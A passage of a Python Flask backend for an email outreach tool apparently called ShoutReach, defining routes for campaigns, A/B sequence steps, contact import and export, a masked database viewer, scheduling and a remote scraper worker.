    c["report"]         = db.get_campaign_contact_report(cid)
    return jsonify(c)


@app.route("/api/campaigns/<int:cid>/export", methods=["GET"])
def api_export_campaign(cid):
    if not _OPENPYXL:
        return jsonify({"error": "openpyxl not installed"}), 500
    c = db.get_campaign(cid)
    if not c:
        return jsonify({"error": "Not found"}), 404
    rows = db.get_campaign_contact_report(cid)

    wb = Workbook()
    ws = wb.active
    ws.title = "Contact Report"

    headers = ["Email", "First Name", "Last Name", "Company",
               "Variant", "Status", "Steps Sent", "Current Step",
               "Next Send", "Enrolled At"]
    header_fill = PatternFill("solid", fgColor="1E293B")
    header_font = Font(bold=True, color="FFFFFF")
    for col, h in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=h)
        cell.font = header_font
        cell.fill = header_fill
        cell.alignment = Alignment(horizontal="center")

    STATUS_LABELS = {
        "queued": "Queued", "active": "Active", "replied": "Replied",
        "bounced": "Bounced", "completed": "Completed", "paused": "Paused",
        "unsubscribed": "Unsubscribed",
    }
    for r, row in enumerate(rows, 2):
        # company and the name fields are scraped from arbitrary websites, so
        # every free-text cell goes through _no_formula.
        ws.cell(r, 1, _no_formula(row["email"] or ""))
        ws.cell(r, 2, _no_formula(row["first_name"] or ""))
        ws.cell(r, 3, _no_formula(row["last_name"] or ""))
        ws.cell(r, 4, _no_formula(row["company"] or ""))
        ws.cell(r, 5, _no_formula(row["variant_label"] or "—"))
        ws.cell(r, 6, STATUS_LABELS.get(row["status"], row["status"] or ""))
        ws.cell(r, 7, row["steps_sent"])
        ws.cell(r, 8, row["current_step"])
        ws.cell(r, 9, row["next_send_at"] or "—")
        ws.cell(r, 10, row["enrolled_at"] or "")
        if row["status"] == "replied":
            shade = PatternFill("solid", fgColor="DCFCE7")
        elif row["status"] == "bounced":
            shade = PatternFill("solid", fgColor="FEE2E2")
        else:
            shade = None
        if shade:
            for col in range(1, 11):
                ws.cell(r, col).fill = shade

    for col, width in zip(range(1, 11), [30, 14, 14, 22, 10, 14, 12, 12, 20, 20]):
        ws.column_dimensions[ws.cell(1, col).column_letter].width = width

    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)
    safe_name = c["name"].replace(" ", "_").replace("/", "-")
    return Response(
        buf.read(),
        mimetype="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={"Content-Disposition": f'attachment; filename="campaign_{safe_name}.xlsx"'},
    )


@app.route("/api/campaigns/<int:cid>", methods=["DELETE"])
@admin_required
def api_delete_campaign(cid):
    db.delete_campaign(cid)
    db.add_log(f"Campaign {cid} deleted")
    return jsonify({"ok": True})


@app.route("/api/campaigns/<int:cid>", methods=["PATCH"])
@admin_required
def api_update_campaign(cid):
    d = request.json or {}
    # Serialize variables dict → JSON string for storage
    if "variables" in d and isinstance(d["variables"], dict):
        d = dict(d)
        d["variables"] = json.dumps(d["variables"])
    db.update_campaign(cid, **d)
    return jsonify({"ok": True})


@app.route("/api/campaigns/<int:cid>/variable-coverage", methods=["GET"])
@admin_required
def api_variable_coverage(cid):
    """
    Which variables are actually populated for the contacts this campaign will
    reach. Writing "Hi {{first_name}}," against a scraped list produces "Hi ,"
    for every recipient, and nothing said so until the mail had gone out.
    """
    return jsonify(db.get_variable_coverage(cid))


@app.route("/api/variable-coverage", methods=["GET"])
@admin_required
def api_variable_coverage_global():
    """Coverage across every contact — for a step being drafted outside a campaign."""
    return jsonify(db.get_variable_coverage(None))


@app.route("/api/campaigns/<int:cid>/activate", methods=["POST"])
@admin_required
def api_activate(cid):
    steps = db.get_steps(cid)
    if not steps:
        return jsonify({"ok": False, "error": "Add at least one sequence step first"}), 400
    if not db.get_smtp_accounts():
        return jsonify({"ok": False, "error": "Configure SMTP settings first"}), 400

    # Contacts enrolled before the variants existed carry no label, and would
    # otherwise sit out the A/B test while appearing to be part of it. Fill
    # them in here, where the campaign's copy is finally settled. Only
    # untouched enrollments are eligible -- see assign_missing_variants.
    assigned = db.assign_missing_variants(cid)

    db.update_campaign(cid, status="active")
    db.add_log(f"▶ Campaign {cid} activated")
    if assigned:
        db.add_log(f"Assigned an A/B variant to {assigned} contact(s) enrolled before variants were set")

    return jsonify({
        "ok": True,
        "variants_assigned": assigned,
        "message": (f"Activated — {assigned} contact(s) enrolled earlier were "
                    f"assigned a variant") if assigned else "Activated",
    })


@app.route("/api/campaigns/<int:cid>/pause", methods=["POST"])
@admin_required
def api_pause(cid):
    db.update_campaign(cid, status="paused")
    db.add_log(f"⏸ Campaign {cid} paused")
    return jsonify({"ok": True})


# ── API: Steps ────────────────────────────────────────────────────────────────

@app.route("/api/campaigns/<int:cid>/steps", methods=["GET"])
def api_get_steps(cid):
    return jsonify(db.get_steps(cid))


@app.route("/api/campaigns/<int:cid>/steps", methods=["POST"])
@admin_required
def api_upsert_step(cid):
    d = request.json or {}
    db.upsert_step(
        campaign_id = cid,
        step_num    = int(d["step_num"]),
        subject     = d.get("subject", ""),
        body_html   = d.get("body_html", ""),
        delay_days  = int(d.get("delay_days", 0)),
    )
    # Save variants if provided (empty list clears/disables A/B for this step)
    if "variants" in d:
        with db.get_db() as conn:
            step = conn.execute(
                "SELECT id FROM steps WHERE campaign_id=? AND step_num=?",
                (cid, int(d["step_num"]))
            ).fetchone()
        if step:
            db.save_step_variants(step["id"], d["variants"])
    return jsonify({"ok": True})


@app.route("/api/campaigns/<int:cid>/steps/<int:step_num>", methods=["DELETE"])
@admin_required
def api_delete_step(cid, step_num):
    db.delete_step(cid, step_num)
    return jsonify({"ok": True})


# ── API: Contacts ─────────────────────────────────────────────────────────────

def _contact_query_args():
    """The filter half of a contacts query, shared by the list and id routes."""
    return {
        "q":               request.args.get("q", ""),
        "source_job_id":   request.args.get("source_job_id") or None,
        "status":          request.args.get("status") or None,
        "include_deleted": request.args.get("include_deleted") == "1",
    }


@app.route("/api/contacts", methods=["GET"])
def api_get_contacts():
    """
    One page of contacts, filtered server-side.

    This used to return a bare list capped at 500 rows that the browser then
    filtered. Past 500 contacts that silently hid the rest -- and a lead-list
    filter applied to a truncated window under-reports without saying so.
    """
    try:
        page     = int(request.args.get("page", 1))
        per_page = int(request.args.get("per_page", 50))
    except (TypeError, ValueError):
        page, per_page = 1, 50

    return jsonify(db.get_contacts_page(
        page=page,
        per_page=per_page,
        sort_col=request.args.get("sort_col", ""),
        sort_dir=request.args.get("sort_dir", "desc"),
        **_contact_query_args(),
    ))


@app.route("/api/contacts/sources", methods=["GET"])
def api_contact_sources():
    """The lead lists — one per scrape, plus a bucket for manual/CSV adds."""
    return jsonify(db.get_contact_sources())


@app.route("/api/contacts/ids", methods=["GET"])
def api_contact_ids():
    """
    Every id matching the current filter, for "select all N matching".

    Without this, select-all could only ever reach the rows on the current
    page, so a bulk action over a filtered list would quietly apply to 50 of
    them.
    """
    ids = db.get_contact_ids_matching(**_contact_query_args())
    return jsonify({"ids": ids, "total": len(ids)})


@app.route("/api/contacts/import", methods=["POST"])
@admin_or_worker_required
def api_import_contacts():
    """
    Accepts JSON body: { "rows": [...] }
    or multipart form with a CSV file field named 'file'.
    """
    import email_validator as _ev
    _CSV_MAX_BYTES = 8 * 1024 * 1024  # 8 MB
    _CSV_MAX_ROWS  = 50_000
    if request.content_type and "multipart" in request.content_type:
        f = request.files.get("file")
        if not f:
            return jsonify({"ok": False, "error": "No file"}), 400
        # Read with a hard cap to avoid OOM on a huge upload.
        raw = f.read(_CSV_MAX_BYTES + 1)
        if len(raw) > _CSV_MAX_BYTES:
            return jsonify({
                "ok": False,
                "error": f"CSV too large (max {_CSV_MAX_BYTES // (1024*1024)} MB).",
            }), 413
        content = raw.decode("utf-8", errors="replace")
        reader  = csv.DictReader(io.StringIO(content))
        rows    = list(reader)
        if len(rows) > _CSV_MAX_ROWS:
            return jsonify({
                "ok": False,
                "error": f"CSV too large (max {_CSV_MAX_ROWS} rows).",
            }), 413
    else:
        data = request.json or {}
        rows = data.get("rows", [])
        if not isinstance(rows, list):
            return jsonify({"ok": False, "error": "rows must be a list"}), 400
        # The multipart path has always been capped; this one was not, so a
        # 16MB JSON body could carry 100k+ rows and each one triggers a
        # blocking DNS lookup below -- enough to stall the single worker.
        if len(rows) > _CSV_MAX_ROWS:
            return jsonify({
                "ok": False,
                "error": f"Too many rows (max {_CSV_MAX_ROWS}).",
            }), 413

    if not rows:
        return jsonify({"ok": False, "error": "No rows"}), 400

    # Extract non-standard columns into the `extra` JSON field
    _STANDARD_COLS = {"email", "first_name", "last_name", "company",
                      "website", "address", "status", "extra", "mx_valid",
                      "phone", "category", "rating", "review_count",
                      "source_job_id"}
    for row in rows:
        # The scraper's own CSV names this column "reviews"; the DB column is
        # "review_count" to read better next to "rating". Re-uploading that
        # CSV through Import should land it as a real column, not in `extra`.
        if "reviews" in row and "review_count" not in row:
            row["review_count"] = row.pop("reviews")
        # A pasted CSV can carry anything in this field; it indexes a real
        # table, so coerce it and drop what isn't a number.
        if row.get("source_job_id") not in (None, ""):
            try:
                row["source_job_id"] = int(row["source_job_id"])
            except (TypeError, ValueError):
                row["source_job_id"] = None
        custom = {k: v for k, v in row.items() if k not in _STANDARD_COLS and v not in (None, "")}
        if custom:
            existing = row.get("extra") or {}
            if isinstance(existing, str):
                try:
                    existing = json.loads(existing)
                except Exception:
                    existing = {}
            existing.update(custom)
            row["extra"] = existing

    # MX-validate each row that has an email.
    #
    # This is a blocking DNS lookup per unseen domain, on the request thread,
    # in a single-worker process. check_mx caches per domain, so a scrape of
    # one city is cheap, but a large paste is not -- past this many rows the
    # rows are stored unvalidated and mx_valid stays NULL ("unchecked") rather
    # than holding the whole app hostage. The worker pre-validates anyway and
    # sends mx_valid with each row.
    _MX_INLINE_LIMIT = 500
    invalid_mx = 0
    if len(rows) <= _MX_INLINE_LIMIT:
        for row in rows:
            email = (row.get("email") or "").strip()
            if email and "@" in email and row.get("mx_valid") is None:
                ok = _ev.check_mx(email)
                row["mx_valid"] = 1 if ok else 0
                if not ok:
                    invalid_mx += 1
    else:
        app.logger.info(
            "Skipping inline MX validation for %d rows (over the %d-row limit)",
            len(rows), _MX_INLINE_LIMIT,
        )

    inserted = db.upsert_contacts(rows)
    return jsonify({"ok": True, "inserted": inserted, "invalid_mx": invalid_mx})


@app.route("/api/contacts/bulk-delete", methods=["POST"])
@admin_required
def api_bulk_delete_contacts():
    ids = (request.json or {}).get("ids", [])
    if not ids:
        return jsonify({"ok": False, "error": "No IDs provided"}), 400
    db.delete_contacts(ids)
    db.add_log(f"Hard-deleted {len(ids)} contacts via UI")
    return jsonify({"ok": True, "deleted": len(ids)})


@app.route("/api/contacts", methods=["POST"])
@admin_required
def api_add_contact():
    d = request.json or {}
    contact_id, err = db.create_contact(
        email      = d.get('email', ''),
        first_name = d.get('first_name', ''),
        last_name  = d.get('last_name', ''),
        company    = d.get('company', ''),
        website    = d.get('website', ''),
        address    = d.get('address', ''),
        status     = d.get('status', 'active'),
    )
    if err:
        return jsonify({'ok': False, 'error': err}), 400
    return jsonify({'ok': True, 'id': contact_id})


@app.route("/api/contacts/<int:cid>", methods=["PUT"])
@admin_required
def api_update_contact(cid):
    d = request.json or {}
    ok, err = db.update_contact(cid, d)
    if not ok:
        return jsonify({'ok': False, 'error': err}), 400
    return jsonify({'ok': True})


@app.route("/api/contacts/<int:cid>", methods=["DELETE"])
@admin_required
def api_delete_contact(cid):
    db.delete_contact(cid)
    return jsonify({'ok': True})


@app.route("/api/campaigns/<int:cid>/contacts", methods=["POST"])
@admin_required
def api_enroll_contacts(cid):
    """
    Enroll contacts from the global contacts pool into a campaign.
    Body: { "contact_ids": [1, 2, 3] }  OR  { "all": true }
    """
    d = request.json or {}

    if d.get("all"):
        with db.get_db() as conn:
            ids = [r[0] for r in conn.execute(
                "SELECT id FROM contacts WHERE status='active'"
            ).fetchall()]
    else:
        ids = d.get("contact_ids", [])

    if not ids:
        return jsonify({"ok": False, "error": "No contact IDs"}), 400

    enrolled, skipped = db.enroll_contacts_bulk(cid, ids)

    # Surface why contacts were left out. Silently enrolling fewer than the
    # operator selected looks like a bug; naming the reason makes the
    # duplicate protection visible instead of mysterious.
    reasons = []
    if skipped.get("other_campaign"):
        reasons.append(f"{skipped['other_campaign']} already in another campaign")
    if skipped.get("duplicate_address"):
        reasons.append(f"{skipped['duplicate_address']} duplicate address at the same business")
    if skipped.get("same_domain"):
        reasons.append(f"{skipped['same_domain']} already being contacted at that business")

    return jsonify({
        "ok": True,
        "enrolled": enrolled,
        "skipped": skipped,
        "message": (
            f"Enrolled {enrolled}" + (f" — skipped {', '.join(reasons)}" if reasons else "")
        ),
    })


@app.route("/api/campaigns/<int:cid>/contacts", methods=["GET"])
def api_campaign_contacts(cid):
    return jsonify(db.get_campaign_contacts(cid))


@app.route("/api/enrollments/<int:enroll_id>", methods=["DELETE"])
@admin_required
def api_unenroll_contact(enroll_id):
    db.unenroll_contact(enroll_id)
    return jsonify({"ok": True})


@app.route("/api/enrollments/<int:enroll_id>/status", methods=["PATCH"])
@admin_required
def api_set_enrollment_status(enroll_id):
    status = (request.json or {}).get("status", "")
    try:
        db.set_enrollment_status(enroll_id, status)
        return jsonify({"ok": True})
    except ValueError as exc:
        return jsonify({"error": str(exc)}), 400


# ── API: Logs ─────────────────────────────────────────────────────────────────

@app.route("/api/logs")
def api_logs():
    return jsonify(db.get_logs(100))


# ── API: Database viewer ───────────────────────────────────────────────────────

_VIEWER_TABLES = [
    "contacts", "campaigns", "enrollments", "sends",
    "steps", "daily_counts", "logs", "settings",
]
# Columns to mask in addition to the settings.value masking handled by _is_secret_key.
_MASKED_COLUMNS = {
    "smtp_accounts": {"smtp_pass", "imap_pass"},
}


@app.route("/api/db/tables")
@admin_required
def api_db_tables():
    result = []
    with db.get_db() as conn:
        for t in _VIEWER_TABLES:
            try:
                count = conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                result.append({"name": t, "count": count})
            except Exception:
                pass
    return jsonify(result)


@app.route("/api/db/table/<name>")
@admin_required
def api_db_table(name):
    if name not in _VIEWER_TABLES:
        return jsonify({"error": "Table not allowed"}), 403

    page     = max(1, int(request.args.get("page", 1)))
    per_page = 50
    offset   = (page - 1) * per_page
    q        = request.args.get("q", "").strip()

    with db.get_db() as conn:
        columns = [
            d[0] for d in
            conn.execute(f"SELECT * FROM {name} LIMIT 0").description
        ]

        sort_col = request.args.get("sort_col", "").strip()
        sort_dir = request.args.get("sort_dir", "desc").lower()
        if sort_dir not in ("asc", "desc"):
            sort_dir = "desc"
        if sort_col in columns:
            order_by = f'"{sort_col}" {sort_dir.upper()}'
        else:
            sort_col = ""
            order_by = "rowid DESC"

        if q:
            conditions = " OR ".join(f'CAST("{col}" AS TEXT) LIKE ?' for col in columns)
            params     = [f"%{q}%" for _ in columns]
            where      = f"WHERE {conditions}"
        else:
            params = []
            where  = ""

        total = conn.execute(
            f"SELECT COUNT(*) FROM {name} {where}", params
        ).fetchone()[0]

        rows = conn.execute(
            f"SELECT * FROM {name} {where} ORDER BY {order_by} LIMIT ? OFFSET ?",
            params + [per_page, offset],
        ).fetchall()

        masked_cols = _MASKED_COLUMNS.get(name, set())
        data = []
        for row in rows:
            r = dict(row)
            if name == "settings" and _is_secret_key(r.get("key") or ""):
                r["value"] = _SECRET_PLACEHOLDER
            for col in masked_cols:
                if col in r and r[col]:
                    r[col] = _SECRET_PLACEHOLDER
            data.append(r)

    return jsonify({
        "columns":  columns,
        "rows":     data,
        "total":    total,
        "page":     page,
        "per_page": per_page,
        "pages":    max(1, (total + per_page - 1) // per_page),
        "sort_col": sort_col,
        "sort_dir": sort_dir,
    })


@app.route("/api/db/table/<name>/export")
@admin_required
def api_db_table_export(name):
    if name not in _VIEWER_TABLES:
        return jsonify({"error": "Table not allowed"}), 403

    with db.get_db() as conn:
        cursor  = conn.execute(f"SELECT * FROM {name} ORDER BY rowid DESC")
        columns = [d[0] for d in cursor.description]
        rows    = cursor.fetchall()

    masked_cols = _MASKED_COLUMNS.get(name, set())
    buf = io.StringIO()
    w   = csv.writer(buf)
    w.writerow(columns)
    for row in rows:
        r = dict(row)
        if name == "settings" and _is_secret_key(r.get("key") or ""):
            r["value"] = _SECRET_PLACEHOLDER
        for col in masked_cols:
            if col in r and r[col]:
                r[col] = _SECRET_PLACEHOLDER
        w.writerow([_no_formula(r.get(col, "")) for col in columns])

    resp = make_response(buf.getvalue())
    resp.headers["Content-Disposition"] = f"attachment; filename={name}.csv"
    resp.headers["Content-Type"] = "text/csv"
    return resp


# ── API: Scheduler status ──────────────────────────────────────────────────────

@app.route("/api/scheduler/status")
def api_scheduler_status():
    return jsonify({"running": scheduler.is_running()})


@app.route("/api/scheduler/trigger", methods=["POST"])
@admin_required
def api_scheduler_trigger():
    # Signal the background scheduler to run on its next wake; do NOT call
    # process_queue() inline — it sleeps up to (max_delay × batch_size) seconds
    # and would hold the HTTP worker open well past gunicorn's timeout.
    scheduler.request_run_now(include_reply_check=False)
    return jsonify({"ok": True, "message": "Queue run requested"})


@app.route("/api/scheduler/run", methods=["POST"])
@admin_required
def api_scheduler_run():
    scheduler.request_run_now(include_reply_check=True)
    return jsonify({"ok": True})


# ── API: Scraper ──────────────────────────────────────────────────────────────

def _job_payload(job: dict) -> dict:
    try:
        logs = json.loads(job.get("logs") or "[]")
    except Exception:
        logs = []
    heartbeat_secs = db._seconds_since(job.get("heartbeat_at"))
    return {
        "job_id":   job["id"],
        "status":   job["status"],
        "progress": job["progress"],
        "total":    job["total"],
        "found":    job["found"],
        "imported": job["imported"],
        "error":    job.get("error") or "",
        "niche":    job["niche"],
        "city":     job["city"],
        "logs":     logs[-80:],
        "heartbeat_secs": None if heartbeat_secs is None else int(heartbeat_secs),
    }


@app.route("/api/scraper/status")
def api_scraper_status():
    db.reap_stale_scrape_jobs()
    seen = db.worker_seconds_since_seen()
    payload = {
        "worker_online": seen is not None and seen < db.WORKER_STALE_SECONDS,
        "worker_last_seen": None if seen is None else int(seen),
    }
    job = db.get_active_scrape_job() or db.get_latest_scrape_job()
    if not job:
        payload["status"] = "idle"
        return jsonify(payload)
    payload.update(_job_payload(job))
    return jsonify(payload)


@app.route("/api/scraper/start", methods=["POST"])
@admin_required
def api_scraper_start():
    db.reap_stale_scrape_jobs()
    if db.get_active_scrape_job():
        return jsonify({"ok": False, "error": "A scrape is already queued or running"}), 409

    d           = request.json or {}
    niche       = d.get("niche", "").strip()
    city        = d.get("city", "").strip()
    auto_import = bool(d.get("auto_import", True))
    try:
        max_results = max(1, min(500, int(d.get("max_results", 50))))
    except (TypeError, ValueError):
        return jsonify({"ok": False, "error": "max_results must be a number"}), 400

    if not niche or not city:
        return jsonify({"ok": False, "error": "Niche and city are required"}), 400

    job_id = db.create_scrape_job(niche, city, max_results, auto_import)
    seen = db.worker_seconds_since_seen()
    warning = None
    if seen is None or seen >= db.WORKER_STALE_SECONDS:
        # Queue it anyway -- it will run as soon as the worker comes up. But
        # say so, or pressing Start against a dead worker looks like a no-op.
        warning = "Queued, but no worker is connected. Start scraper_worker.py on your machine."
    return jsonify({"ok": True, "job_id": job_id, "warning": warning})


@app.route("/api/scraper/stop", methods=["POST"])
@admin_required
def api_scraper_stop():
    job = db.get_active_scrape_job()
    if job:
        db.flag_scrape_job(job["id"], stop=True)
        if job["status"] == "queued":
            # Never claimed, so no worker will ever see the flag.
            db.update_scrape_job(job["id"], status="stopped", finished=True)
    return jsonify({"ok": True})


@app.route("/api/scraper/resume", methods=["POST"])
@admin_required
def api_scraper_resume():
    job = db.get_active_scrape_job()
    if job:
        db.flag_scrape_job(job["id"], resume=True)
    return jsonify({"ok": True})


# ── API: scrape worker (machine-to-machine, X-API-Key) ────────────────────────

@app.route("/api/scraper/claim", methods=["POST"])
@worker_auth_required
def api_scraper_claim():
    db.touch_worker_seen()      # polling for work is itself a sign of life
    db.reap_stale_scrape_jobs()
    job = db.claim_scrape_job()
    if not job:
        return ("", 204)
    return jsonify({
        "job_id":      job["id"],
        "niche":       job["niche"],
        "city":        job["city"],
        "max_results": job["max_results"],
        "auto_import": bool(job["auto_import"]),
    })


@app.route("/api/scraper/jobs/<int:job_id>/progress", methods=["POST"])
@worker_auth_required
def api_scraper_progress(job_id):
    db.touch_worker_seen()
    d = request.json or {}
    logs = d.get("logs") or []
    if not isinstance(logs, list):
        logs = []
    control = db.update_scrape_job(
        job_id,
        status=d.get("status"),
        progress=d.get("progress"),
        total=d.get("total"),
        found=d.get("found"),
        imported=d.get("imported"),
        error=d.get("error"),
        new_logs=logs[:100],
        finished=bool(d.get("finished")),
    )
    return jsonify(control)


@app.route("/api/scraper/heartbeat", methods=["POST"])
@worker_auth_required
def api_scraper_heartbeat():
    """Idle check-in so the UI can show the worker as online between jobs."""
    db.touch_worker_seen()
    return jsonify({"ok": True})


# ── Run ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "─" * 60)
    print("  📣  ShoutReach")
    print("  ─────────────────────────────────────────────")
    print("  Dashboard: http://localhost:5000")
    print("  Press Ctrl+C to stop")
    print("─" * 60 + "\n")
    # Debug defaults OFF in production. Enable with FLASK_DEBUG=1.
    debug_mode = os.environ.get("FLASK_DEBUG") == "1"
    app.run(
        debug=debug_mode,
        host=os.environ.get("HOST", "127.0.0.1"),
        port=int(os.environ.get("PORT", 5000)),
        use_reloader=debug_mode,
    )
